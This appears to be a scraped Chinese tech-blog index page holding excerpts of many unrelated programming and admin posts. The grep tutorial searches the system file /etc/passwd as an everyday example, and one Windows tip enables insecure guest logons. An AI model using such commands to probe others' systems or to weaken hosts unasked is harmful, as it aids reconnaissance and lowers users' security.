		目录 失败代码展示失败原因解决办法1、idea工具重新再入低版本maven，2019.3的idea可以导入3.5.4版本的maven（亲测有效）2、另外**检测**个人的idea配置，我的默认设置是jre，但是jre不满足我们需要，**最好设置为jdk**：3、导入的项目中最好避免出现【中文】 失败代码展示 Caused by: java.lang.RuntimeException: com.google.inject.ProvisionException: Unable to provision, see the following errors: 1) Error injecting constructor, java.lang.NoSuchMethodError: org.apache.maven.model.validation.DefaultModelValidator: method 'void &lt;init&gt;()' not found at org.jetbrains.idea.maven.server.embedder.CustomModelValidator.&lt;init&gt;(Unknown Source) while locating org.jetbrains.idea.maven.server.embedder.CustomModelValidator at ClassRealm[maven.ext, parent: ClassRealm[plexus.core, parent: null]] (via modules: org.eclipse.sisu.wire.WireModule -&gt; org.eclipse.sisu.plexus.PlexusBindingModule) while locating org.apache.maven.model.validation.ModelValidator annotated with @com.google.inject.name.Named(value="ide") 失败原因 解决办法 1、idea工具重新再入低版本maven，2019.3的idea可以导入3.5.4版本的maven（亲测有效） 低版本的maven下载链接如下：maven
2、另外检测个人的idea配置，我的默认设置是jre，但是jre不满足我们需要，最好设置为jdk： 3、导入的项目中最好避免出现【中文】 以上仅个人的经验，若有不妥之处还望大佬不吝赐教，感谢~~
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/9410114b985fd99b72600161a60f434b/" rel="bookmark">
			ODPS SQL优化总结
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		ODPS(Open Data Processing Service)是一个海量数据处理平台，基于阿里巴巴自主研发的分布式操作系统(飞天)开发，是公司云计算整体解决方案中最核心的主力产品之一。本文结合作者多年的数仓开发经验，结合ODPS平台分享数据仓库中的SQL优化经验。
背景
数据仓库，是一个面向主题、集成的、随时间变化的、信息本身相对稳定的数据集合。数据仓库从Oracle（单机、RAC)，到MPP(Green plum)，到Hadoop(Hive、Tez、Sprak)，再到批流一体Flink/Blink、数据湖等，SQL都是其主流的数据处理工具。海量数据下的高效数据流转，是数据同学必须直面的一个挑战。本文结合阿里自研的ODPS平台，从自身工作出发，总结SQL的一些优化技巧。
基础知识
▐ Hive SQL的执行过程 Hive SQL的编译到执行，可以参考《Hive SQL的编译过程》，里面详细介绍了神奇的SQL如何在大数据平台编译与执行的过程。
《Hive SQL的编译过程》地址：https://tech.meituan.com/2014/02/12/hive-sql-to-mapreduce.html
▐ SQL的基础语法 大佬们写过很多SQL基础入门的文章，也可以参考Hive SQL的官方文档。
Hive SQL的官方文档地址：https://cwiki.apache.org/confluence/display/Hive//GettingStarted#GettingStarted-SQLOperations
经验总结与沉淀
▐ SQL的一些使用技巧 null
我们在进行=/&lt;&gt;/in/not in等判断时，null会不包含在这些判断条件中，所以在对null的处理时可以使用nvl或者coalesce函数对null进行默认转换。
select *
在数据开发或者线上任务时，尽可能提前对列进行剪裁，即使是全表字段都需要，也尽可能的把字段都写出来(如果实在觉得麻烦，可以使用数据地图的生成select功能)，一是减少了数据运算中不必要的数据读取，二是避免后期因为原表或者目标表字段增加，导致的任务报错。
multi insert
读取同一张表，但是因为粒度不同，需要插入多张表时，可以考虑使用 from () tab insert overwrite A insert overwrite B 的方式，减少资源的浪费。当然，有些团队的数仓开发规范中会规定一个任务不能有两个目标表，具体情况可以视情况尽可能复用公共数据，如通过临时表的方式临时存储这部分逻辑。
分区限定
ODPS表大部分都是分区表，分区表又会根据业务规则分为增量表、全量表、快照表等。所以在做简单查询，或者数据探查时，一定要养成习惯先限定分区ds。经常会在jobhistory中看到很多好资源的任务都是因为分区限定不合理或者没有限定分区导致的。
limit的使用
临时查询或者数据探查时，养成习惯加上limit，会快速的查询出你想要的数据，且消耗更少的资源。
UDF函数的使用
尽可能把UDF的使用下沉到第一层子查询中，效率会有很大的提升。
行转列、列转行
collect_set 、lateral view函数可以实现行转列或者列转行的功能，好多大佬也都写过类似的ATA，可以参考。
窗口函数的使用
可以通过 row_number()/rank() over(partition by order by )的方式实现数据按照某个字段分组的排序，也可以通过 max(struct())的方式实现。
关联
左关联、内关联、右关联、left anti join 、left semi join等，可以实现不同情况下的多表关联。关联字段要确保字段类型的一致。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/9410114b985fd99b72600161a60f434b/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/b11159555244883df14d3d6d4122a325/" rel="bookmark">
			最短路算法c&#43;&#43;(dijsktra,floyd,spfa)
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		floyd，复杂度
void floyd(int s,int e)//start end { for(int k=1;k&lt;=n;k++) for(int i=1;i&lt;=n;i++) for(int j=1;j&lt;=n;j++) if(g[i][j]&gt;g[i][k]+g[k][j]) g[i][j]=g[i][k]+g[k][j]; cout&lt;&lt;g[s][e]&lt;&lt;endl; } dijsktra struct Node{ int to,dis; };//携带边的终边，长度信息 vector&lt;Node&gt; g[maxn]; void add(int u,int v,int w) { g[u].push_back({v,w}); } int dis[maxn];//最短路数组 typedef pair&lt;int,int&gt; P;//将int,int型数据重命名为P void dij(int start){ memset(dis,0x3f,sizeof(dis));//初始最短路为inf priority_queue&lt;P,vector&lt;P&gt;,greater&lt;P&gt; &gt; q;//小根堆，堆顶是最小值 dis[start]=0;//起点自己距离为0 q.push(P(0,start));//起点入队，注意pair数组第一个是距离，第二个是点号 while(!q.empty()){ P p=q.top(); q.pop();//取出堆顶 int u=p.second; if(dis[u]&lt;p.first) continue; //祖传优化，同一点可能多次入队，如果答案更劣可以舍弃 for(int i=0;i&lt;g[u].size();i++){//邻接表遍历 int v=g[u][i].to; if(dis[v]&gt;dis[u]+g[u][i].dis){//松弛 dis[v]=dis[u]+g[u][i].dis;//成功了就更新，入队 q.push(P(dis[v],v)); } } } return ; } spfa bool spfa(int st) { vector&lt;int&gt; dis(n,inf), vis(n, 0), cnt(n, 0); dis[st] = 0; vis[st] = 1; queue&lt;int&gt; q; q.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/b11159555244883df14d3d6d4122a325/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/ca85771ed48a39400f535a9581a58dcc/" rel="bookmark">
			numpy练手：如何用python做一个生命游戏（元胞自动机）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		首先，什么是生命游戏？
生命游戏是一种再空间上，时间上都离散的运动理论模型，简单点来说，就是模拟生命体的最小单元-细胞 的前后时间的状态，而且游戏规则是自订的，所以我就随便写了个游戏规则（一个周边的细胞小于2中间有细胞则死亡，为4时中间没有细胞则多生成细胞，大于四如果有细胞则死亡），如果想换成使用者想要的规则，请自己适当修改代码
实现：
要使用库：numpy（需要自行下载），tkinter
导入：
import numpy as np from tkinter import * 接下来需要考虑是选择细胞离散的生成还是自己放制，因为我主打娱乐向，就选择了自己放制了
好，模拟生命游戏总得有个场地吧，那我就选择用numpy生成一个50x50全是0的矩阵，0代表没有细胞
ground=np.zeros(shape=(50,50)) 好，场地设置完成，接下来就要写一个放置细胞的函数细胞
def cell_place(x,y): global ground ground[x,y]=1 接下来，细胞总得演化吧，那么我们就写一个演化的逻辑判断，再封装到一个函数中
def calculus(): global ground for high in range(50): for widh in range(50): if high - 1 &gt;= 0 and widh - 1 &gt;= 0: area=ground[high-1:high+2,widh-1:widh+2] number = np.sum(area) if number &lt; 2 and ground[high,widh] == 1: ground[high,widh]=0 elif number &gt; 3 and ground[high,widh] == 0: ground[high,widh]=1 elif number &gt; 4 and ground[high,widh] == 1: ground[high,widh]=0 elif widh &gt;= 0: area=ground[high:high+2,widh-1:widh+2] number = np.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/ca85771ed48a39400f535a9581a58dcc/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/db680d3cc3ee94bf8c49b228429c0040/" rel="bookmark">
			WSL 忘记密码重置
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 win+X+A——以管理员身份运行powershell输入 wsl -u root ——以root身份登陆wsl然后输入 passwd username，输入并确认新的密码exit 退出wsl
即完成重置。 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/8c4916a5a02c498785613aeec9389b7c/" rel="bookmark">
			AutoSAR入门到精通讲解 (AuroSAR-CP描述) 1.1 AutoSAR-CP简介
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1. 概述 近年来，自动驾驶新能源汽车比较火爆，AutoSAR工程师也是极奇需缺，本专栏记录AutoSAR学习过程。
2. 什么是AutoSAR 2.1 简易描述 AUTOSAR 就是Automotive Open System Architecture的简称，中文翻译就是汽车开放系统架构。 将汽车电子控制单元（ECU）的软件底层做了一个标准的封装。使得大家都能共用一套底层软件，只需要修改其中的一些参数，就可以匹配不同硬件，也可以匹配不同的应用层软件。如此之后，用户只需要专心负责应用层功能开发即可，底层都交给AutoSAR工程师就行了更加容易理解但不是很准确的讲就是： “就是一套写的比较好的底层软件”。其实现了硬件驱动的封装（类似于STM32的库），实现了操作系统的功能。用户只需要开发操作系统上层的软件应用即可（类似于基于安卓开发App）
2.2 AutoSAR架构描述 首先我们来看一张整体的架构图，以后我们会在这张图上细分和深入，添加细节来补充完整。首先就能看出AutoSAR主要分为3个层级：应用软件层（AppL），实时运行环境（RTE）和基础软件层（BSW）
应用软件层（Application Layer）：存放用户应用层代码的地方实时运行环境层（Runtime Environment）：提供应用层所需要的一些资源，同时将应用层和底层分离基础软件层（Basic Software）：这一层从图中就可以看出，比其它几层都庞大，它主要是将对硬件的操作封装成统一AutoSAR标准的接口，供上层系统调用，需要将其封装到一个标准操作系统的状态才行硬件层（Hardware）：由硬件工程师设计的PCBA
3. AutoSAR层级介绍 3.1 应用软件层（APPL） 该层是由一个一个SWC组成的，每个SWC咱们可以理解为一个.c文件，而整个应用软件层就是一个文件夹。如下图说明了对应关系，可以看出，这里的整个工程就是我们的AutoSAR架构，而其中的AppL、RTE和BSW都分别对应一个文件夹，而我们的SWC组件就是一个一个的.c文件（和.h）
（注意：标准AutoSAR工程与其有较大差异，这里只是做一个大致划分） 3.2 实时运行环境层(RTE) 什么是RTE呢？将硬件层比做我们常用的PC主机，BSW层比作我们的Ubuntu或者Windows系统，AppL就是QQ、微信等应用程序，而RTE就像是虚拟机（VM）一样，兼容各个硬件平台，AppL可以随意跑在上面。
3.3 基础软件层(BSW) 基础软件层又分为四大类，分别是如下描述：
硬件抽象层（MCAL）：可能用过STM32的童鞋应该都知道库的概念，硬件抽象层又叫MCAL，就是将芯片的寄存器操作都封装成一个AutoSAR规定的统一的库Api。就是说这套Api是不同厂商都支持的，但是底层怎么实现，就是芯片厂商的事了。同时也有软件工具EB，可以通过界面配置MCAL功能ECU抽象层：如果说MCAL只封装了芯片，那么ECU抽象层就是将硬件上所有的硬件都进行了封装。比如我们的控制器上有一个主芯片英飞凌的TC397，还有采样电路，电源电路，CAN电路等等。而MCAL就是封装了芯片上有的功能。而ECU抽象层就是将所有的这些都做一个统一的封装。所以不管硬件是如何实现的，这里封装后，也形成了统一的Api服务层：这里有是更加高级的一层了，服务层里是包含操作系统（OS）的。OS将使用ECU抽象层的Api，再对上层暴露出服务接口，其实就是嵌入式实时操作系统（RTOS）所作的工作。复杂驱动：又叫做CDD，主要工作是将AutoSAR未定义的一些功能封装起来，给应用层提供接口来调用这些功能。（简单说就是其他的概念） 4. AutoSAR工具链介绍 目前主流的主要是以下两种开发模式：
MATLAB + DaVinci（国内主流，参考书籍有《基于AUTOSAR规范的车用电机控制器软件开发》）MATLAB + ETAS（博世和联电主要用这个，参考书籍有《AUTOSAR规范与车用控制器软件开发》） 4.1 工具链介绍 这里主要介绍第一种国内主流的工具链：MATLAB + DaVinci
MATLAB ：主要是应用层做算法用的，比较方便实用DaVinci Developer：主要用来搭建设计APPL的框架架构DaVinci Configurator pro： 主要用来配置BSW和自动生成RTE的 返回总目录
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/0d39ad8025a331acbd73b81e28c9a25c/" rel="bookmark">
			【印刷行业】RICOH MH5320和MH5340喷头(G6)
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		00. 目录 文章目录 00. 目录01. 概述02. MH5320/5340特征03. MH5320/5340规格04. MH5320/5340参数05. 理光喷头系列06. MH5320/MH5340喷头视频介绍07. 附录 01. 概述 株式会社理光（总裁：山下良则）于2019年3月份开发并全新推出作为印刷系统核心零部件使用的工业喷墨头“RICOH MH5320/5340”
近年来，与广告牌、纺织品制作相关的工业印刷市场需要满足多品种小批量生产、交货期短等的各种客户需求。为了满足这种需求，无需制版、可灵活生产的喷墨打印正在加快推进数字化进程，对有助于提高图像精细度和高生产效率的喷墨头的需求不断增长。
新产品是作为“RICOH MH5420/5440”以及“RICOH MH5421/5441”的高端机型而推出的，上述两款产品在中国国内的广告牌市场拥有大量的销售业绩，并获得了客户的高度评价。和现有的喷墨头相比，在可支持最小液滴量5pl（微微升）的同时，进一步提高了落点精度，可实现颗粒感小、高精细的印刷。另外，大墨滴喷射时，也可以通过最高50kHz的驱动频率提高印刷速度和生产效率。
此外，通过采用理光独自研发的不锈钢接合技术，加强了墨水兼容能力，可以兼容UV、水性、溶剂等所有墨水。特别是大幅提高了对水性墨水的兼容能力，同水性墨水专用喷墨头MH5421/5441相比，寿命延长了两倍以上 （ 同本公司相比 ） 。* 除了广告牌用途之外，在纺织品制作方面也能实现高生产效率和高耐久性。
02. MH5320/5340特征 高打印质量和高生产力
最小的 5pl 墨滴尺寸和改进的喷射精度可产生出色的打印质量，而不会产生颗粒感。该打印头配置 4 x 150dpi 行的 1,280 个喷嘴，可实现高分辨率 600dpi 打印。灰度的最大频率为 50kHz，可提高生产力。
增强墨水兼容性
该打印头与 UV、溶剂和水性墨水兼容。具体来说，MH5320/MH5340的水性墨水兼容性和使用寿命是之前的MH5421/MH5441的两倍以上。
系统兼容性
使用打印头表面的一种新的、直接的对齐方法可实现高精度定位和轻松对齐。更换打印头很简单。除了官方 MH 线缆，客户可以根据需要使用现有线缆结构设计与其应用兼容的线缆。
03. MH5320/5340规格 04. MH5320/5340参数 05. 理光喷头系列 目前理光gen喷头系列有：
Gen6-MH5320/5340；
Gen5-5420/5421、MH521MF/F、MH5440/MH5441、MH5220；
Gen4-MH2620/2820、MH2420、GH2220
06. MH5320/MH5340喷头视频介绍 理光G6喷头MH5320和MH5340介绍视频
07. 附录 官网：https://industry.ricoh.com/en/
下载：RICOH_MH5320_5340
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/d7c08bb23b9b1739a34331a0086ee30b/" rel="bookmark">
			【印刷行业】RICOH MH5420和MH5440喷头(G5)
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		00. 目录 文章目录 00. 目录01. 概述02. MH5420/5440特征03. MH5420/5440参数04. MH5420/5440规格05. 附录 01. 概述 02. MH5420/5440特征 单程 600dpi 高分辨率打印 并支持多种墨水颜色
该打印头配置 4 x 150dpi 行的 1,280 个喷嘴，可实现高分辨率 600dpi 打印。此外，墨水路径是隔离的，使单个喷头能够喷射多达四种墨水颜色。
支持灰度
实现出色的灰度渲染，每点最多 4 级。
出色的耐用性 和延长的使用寿命
理光喷墨打印头由不锈钢制成。这些喷头非常坚固，为多种墨水提供出色的防腐性能，从而实现出色的耐用性和延长使用寿命。
支持不同的墨水
凭借其内置加热器，这些喷头能够喷射高粘度墨水。此外，墨水路径与致动器（压电元件）隔离，即没有墨水接触。
可变滴量能力
多墨滴功能允许创建一系列墨滴尺寸，从而实现灰度打印。
03. MH5420/5440参数 04. MH5420/5440规格 05. 附录 理光中国：https://www.ricoh.com.cn/
全球官网：https://industry.ricoh.com/en/products/
下载：RICOH_MH5420_5440.pdf
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/65cae2d4b4c1993b04d06f4bc0522d4e/" rel="bookmark">
			STM32多IIC设备的软件IIC实现
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 前言一、Software_IIC.h二、起始时序三、停止时序四、发送数据时序五、读取时序六、应答时序程序代码 前言 在项目中遇到要驱动10个IIC设备其中有8个地址相同并且无法更改的情况，使用宏定义形式的IO口操作不能很好的满足需求。
一、Software_IIC.h 将IIC协议信息抽象到IIC_TypeDef结构体中，包括一个SDA、SCL引脚以及一个地址信息，这样在使用软件IIC时只需要定义IIC_TypeDef的结构体就可以了，并且可以很好的复用IIC操作的代码。
如我这种8个地址相同的情况就可以定义如下IIC设备：
IIC_Typedef IIC1 = { {RCC_AHB1Periph_GPIOH, GPIOH, 4}, {RCC_AHB1Periph_GPIOH, GPIOH, 5}, 0xA0, }; IIC_Typedef IIC2 = { {RCC_AHB1Periph_GPIOH, GPIOH, 4}, {RCC_AHB1Periph_GPIOH, GPIOH, 6}, 0xA0, }; IIC_Typedef IIC3 = { {RCC_AHB1Periph_GPIOH, GPIOH, 4}, {RCC_AHB1Periph_GPIOH, GPIOH, 7}, 0xA0, }; IIC_Typedef IIC4 = { {RCC_AHB1Periph_GPIOH, GPIOH, 4}, {RCC_AHB1Periph_GPIOH, GPIOH, 5}, 0xA8, }; /** * @Author: 时间世纪 * @Date: 2021-08-06 13:35:00 * @Description: 软件IIC驱动程序 */ #ifndef _SOFTWARE_IIC_H_ #define _SOFTWARE_IIC_H_ #include "
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/65cae2d4b4c1993b04d06f4bc0522d4e/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/75f5209a39f0f47eb87788d7c9904225/" rel="bookmark">
			神经网络与深度学习（二） pytorch入门——张量
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		本文章通过参考飞桨AI Studio - 人工智能学习与实训社区 教程进行pytorch相关学习。 目录 一. 概念：张量、算子
二. 使用pytorch实现张量运算
1.2.1 创建张量
1.2.1.1 指定数据创建张量
1.2.1.2 指定形状创建
1.2.1.3 指定区间创建
1.2.2 张量的属性
1.2.2.1 张量的形状
1.2.2.2 形状的改变
1.2.2.3 张量的数据类型
1.2.2.4 张量的设备位置
1.2.3 张量与Numpy数组转换
1.2.4 张量的访问
1.2.4.1 索引和切片
1.2.4.2 访问张量
1.2.4.3 修改张量
1.2.5 张量的运算
1.2.5.1 数学运算
1.2.5.2 逻辑运算
1.2.5.3 矩阵运算
1.2.5.4 广播机制
三. 使用pytorch实现数据预处理
一. 概念：张量、算子 张量：张量为我们提供了描述具有任意数量轴的n维数组的通用方法，是矩阵的扩展与延伸。张量类似于Numpy的多维数组(ndarray)的概念，可以具有任意多的维度。
算子：算子是构建复杂机器学习模型的基础组件，包含一个函数f(x)的前向函数和反向函数。深度学习算法由一个个计算单元组成，我们称这些计算单元为算子。
二. 使用pytorch实现张量运算 1.2.1 创建张量 创建一个张量可以有多种方式，如：指定数据创建、指定形状创建、指定区间创建等。
1.2.1.1 指定数据创建张量 通过给定Python列表数据，可以创建任意维度的张量。
（1）通过指定的Python列表数据[2.0, 3.0, 4.0]，创建一个一维张量。
import torch X = torch.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/75f5209a39f0f47eb87788d7c9904225/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/f5325e9f84fe760f3dc5778804e2fc0b/" rel="bookmark">
			uni-app真机调试报错：TypeError: null is not an object (evaluating ‘data.height‘) __ERROR
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		在小程序里能够正常运行，app里就会报这个错
TypeError: null is not an object (evaluating ‘data.height’) __ERROR
报错代码：这里是通过home-data节点来获取可视区域的高度
&lt;view class="home-data"&gt; &lt;block v-for="(k,i) in item.data" :key="i"&gt; &lt;!-- 推荐模板 --&gt; &lt;IndexSwiper v-if="k.type === 'swiperList'" :dataList="k.data"&gt;&lt;/IndexSwiper&gt; &lt;template v-if="k.type === 'recommenList'"&gt; &lt;Recommend :dataList="k.data"&gt;&lt;/Recommend&gt; &lt;Card cardTitle="猜你喜欢"&gt;&lt;/Card&gt; &lt;/template&gt; &lt;CommodityList v-if="k.type === 'commodityList'" :dataList="k.data"&gt;&lt;/CommodityList&gt; &lt;/block&gt; &lt;/view&gt; onReady(){ // 获取（home-data）内容高度 let view = uni.createSelectorQuery().select(".home-data"); view.boundingClientRect(data =&gt; { this.clientHeight = data.height; }).exec(); }, 报错原因：这段代码是没有问题的，之所以会报这个错是因为在home-data下放的是自定义组件，并且是进行了数据请求渲染出来的值，就获取不到这个home-data了。具体为什么获取不到不了解。
解决方法：使用uni-app里的scroll-view ，将home-data节点换成scroll-view
&lt;scroll-view scroll-y="true" :style="'height:'+clientHeight+'px'"&gt; &lt;block v-for="(k,i) in item.data" :key="i"&gt; &lt;!-- 推荐模板 --&gt; &lt;IndexSwiper v-if="
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/f5325e9f84fe760f3dc5778804e2fc0b/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/4064f88e8db16958c053737d467abdc6/" rel="bookmark">
			Linux Grep 正则表达式示例
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		转载自：Linux Grep 正则表达式示例
grep 是 Linux 中用于文本处理的最有用和功能最强大的命令之一。在本文中，我们将探讨如何在 grep 的 GNU 版本中使用正则表达式的基础，该版本在大多数 Linux 操作系统中默认可用
grep是 Linux 中用于文本处理的最有用和功能最强大的命令之一。grep在一个或多个输入文件中搜索与正则表达式匹配的行，并将每条匹配的行写入到标准输出。
正则表达式是与一组字符串匹配的模式。模式由运算符，文字字符和元字符组成，它们具有特殊的含义。GNU grep支持三种正则表达式语法 Basic，Extended 和 Perl-compatible。
当没有给出正则表达式类型时，grep以 Basic 的形式调用，grep将搜索模式解释为基本 Basic 正则表达式。要将模式解释为扩展 Extended 的正则表达式，请使用-E/--extended-regexp选项。
在 GNU grep的实现中，基本正则表达式和扩展正则表达式语法之间在功能上没有区别，且两者一样。
唯一的区别是，在基本正则表达式中的元字符?，+，{，|，(和)被解释为文字字符，即不将这些字符作为正则解释。
为了在使用基本正则表达式时保持元字符的特殊含义，必须使用反斜杠\对字符进行转义。稍后我们将解释这些和其他元字符的含义。
通常，您应始终将正则表达式括在单引号中，以避免 shell 解释和执行元字符在 shell 在意义。
字符匹配 grep命令的最基本用法是在文件中搜索字符或字符串。除了在可以搜索文件的内容之外，grep 还可以搜索标准输入的内容。
例如要搜索使用bash作为默认的登录 shell 用户，则可以在/etc/passwd文件中搜索包含bash字符串的所有行。
以下grep命令将搜索文件的内容，然后打印包含使用 bash 作为登录 shell 的用户：
grep bash /etc/passwd 输出应如下所示：
root:x:0:0:root:/root:/bin/bash myfreax:x:1000:1000:myfreax:/home/myfreax:/bin/bash 在此示例中，字符串bash是一个基本的正则表达式，由四个字符组成。这告诉grep搜索紧随其后的b，a，s，h字符串。
默认情况下，grep命令区分大小写。这意味着将大写和小写字符视为不同的字符。要在搜索时忽略大小写，请使用-i/--ignore-case选项。
值得一提的是grep将搜索模式作为字符串而不是单词进行搜索 / 查找。因此，如果您要搜索gnu，grep还将打印在较大的单词中嵌入 gnu 的行。例如cygnus或magnum。
如果搜索一个完全限定的字符串或者包含空格的字符串，则需要将其用单引号或双引号引起来，这：
grep "Gnome Display Manager" /etc/passwd 行头与行尾 ^脱字符号表示与行的开头的字符串匹配。如果正则表达式以^开头，grep将在每行的开头开始匹配^之后的字符串。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/4064f88e8db16958c053737d467abdc6/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/6e5400ead120da59c554bda95e8e0a22/" rel="bookmark">
			mac系统下word和excel设置文件打开密码，输入密码才能打开文件
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		mac系统下word和excel文件设置打开密码，实现输入密码才能打开文件
word加密 word版本
菜单栏选择[工具]-&gt;[保护文档]，然后弹窗中输入密码，即可完成加密
excel加密 excel版本信息
值得注意的是，设置文件打开密码的方式与word不同，下图不能设置打开文件密码
正确的设置密码的方式是，[文件]-&gt;[另存为]，另存为弹窗中点击[选项]，弹出打开权限密码设置窗口
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/2e5e4d7b25c632560ad601e8ed5168e2/" rel="bookmark">
			java: Annotation processing is not supported for module cycles
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		问题 原因 模块之间的依赖存在闭环，如A模块依赖B模块，B模块依赖C模块，而C模块又依赖A模块；或者A模块依赖B模块，B模块依赖A模块等等形式
解决 找到报错模块，例如下：
这里traffic-api-commonts模块和traffic-system模块有问题，在有问题模块的目录下进行如下操作：
右击 - Analyze - Analyze Module Dependencies
依赖关系如下图所示：
分析：
traffic-system模块依赖traffic-api-commonts模块，而traffic-system模块又依赖traffic-api-commonts，形成了闭环依赖。
解除闭环：
通过调整模块之间的依赖关系，解除闭环，例如删除A模块对B模块的依赖，或者删除B模块对A模块的依赖。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/80128f3ab6ed829dfb2cf82802122409/" rel="bookmark">
			Windows 10 无法访问共享文件夹
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1.错误提示： 2.解决方案： Windows + R 键 调用 运行窗口，输入gpedit.msc（本地组策略编辑器）
计算机配置--管理模板--网络--Lanman工作站--启用不安全的来宾登录：已启用
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/7d780e19f62f024f3389caf119cac188/" rel="bookmark">
			Mac for m1和m2(arm)：在linux中安装mysql的方式
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		mac for m1(arm)：在linux中安装mysql的方式 如果你是Windows请参考一篇文章：Windows虚拟机中Linux在线安装mysql
1、下载mysql压缩包
安装包下载地址
选择arm版本下载，选择mysql-8.0.28-1.el7.aarch64.rpm-bundle.tar
2、将压缩包上传到linux虚拟机中
通过scp指令上传，这个指令使用的前提是要开启虚拟机22端口
scp mysql-8.0.28-1.el7.aarch64.rpm-bundle.tar root@linuxip地址:/opt/local 3、解压压缩包
cd /opt/local tar -xvf mysql-8.0.28-1.el7.aarch64.rpm-bundle.tar 4、可以看到这个mysql包的后缀中是有rpm的，所以这个包并不是像我们直接在官网下载的mysql压缩包那样直接安装，还需要我们做一些额外处理
rpm -qa | grep mariadb yum remove mariadb-libs-5.5.68-1.el7.aarch64 其中弹出的选择直接选y
5、下面按序安装解压出来的包（按照如下顺序安装）
rpm -ivh mysql-community-common-8.0.28-1.el7.aarch64.rpm rpm -ivh mysql-community-client-plugins-8.0.28-1.el7.aarch64.rpm rpm -ivh mysql-community-libs-8.0.28-1.el7.aarch64.rpm rpm -ivh mysql-community-client-8.0.28-1.el7.aarch64.rpm rpm -ivh mysql-community-icu-data-files-8.0.28-1.el7.aarch64.rpm rpm -ivh mysql-community-server-8.0.28-1.el7.aarch64.rpm 6、初始化数据库
mysqld --initialize --console 7、注意，这个方式安装的mysql路径在/opt/lib/mysql下
chown -R mysql:mysql /opt/lib/mysql/ chown -R mysql:mysql /opt/log/mysqld.log 8、启动mysql
systemctl start mysqld # 设置mysql为开机自启 systemctl enable mysqld 查看mysql状态
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/7d780e19f62f024f3389caf119cac188/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/c83a0dd54b58c501edc3b1fd4b4b31b2/" rel="bookmark">
			AOP思想与插件化技术在安卓上的实践应用
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		/ 今日科技快讯 /
近日，国家计算机病毒应急处理中心和360公司分别发布了关于西北工业大学遭受境外网络攻击的调查报告，调查发现，美国国家安全局下属的特定入侵行动办公室多年来对我国国内的网络目标实施了上万次的恶意网络攻击，控制了相关网络设备，疑似窃取了高价值数据。
/ 作者简介 /
本篇文章来自赵敏的投稿，文章主要分享了安卓插件化的实践应用，相信会对大家有所帮助！同时也感谢作者贡献的精彩文章。
/ 引言 /
对于大多数高级语言开发者，把一个文字描述的需求转化为代码时，需要从顶向下进行模块、类、方法的设计，去思考每个类的职责，去设计模块之间、类之间的接口，以保证后续业务变化时，可以尽可能地减少对存量代码的修改。在这个过程中，常用的都是面向对象的编程思维（Object Oriented Programming，OOP）。
但是，对于数据打点、日志输出、性能监测、权限申请、行为统计、数据缓存等特殊的场景，需要在工程的各个角落插入一些与本身业务逻辑相关性不高的模板代码，天然存在极强的入侵性。如何降低对已有代码结构的入侵？避免增加重复的模板代码？此时，一种更好的解决思维则是面向切面编程（Aspect Oriented Programming，AOP）。
